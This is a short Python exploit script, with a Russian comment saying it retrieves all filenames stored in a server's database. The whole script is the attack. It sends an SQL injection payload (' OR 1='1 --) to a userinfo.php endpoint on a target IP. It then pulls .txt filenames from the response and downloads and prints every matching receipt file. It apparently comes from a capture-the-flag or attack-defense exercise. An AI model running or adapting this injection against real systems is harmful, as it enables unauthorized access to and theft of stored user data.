#!/usr/bin/env python3

# Получает список всех имён файлов, которые сохранены в базе данных сервера

import sys
import re
import requests

ip = sys.argv[1]

url = f"http://{ip}:7000/userinfo.php?user=' OR 1='1 --"
receipt_url = f"http://{ip}:7000/receipts/"

r = requests.get(url)

pattern = r'\b[\w\-\.]+\.txt\b'
filenames = re.findall(pattern, r.text)

for filename in filenames:
    r = requests.get(receipt_url + filename)
    print(r.text)
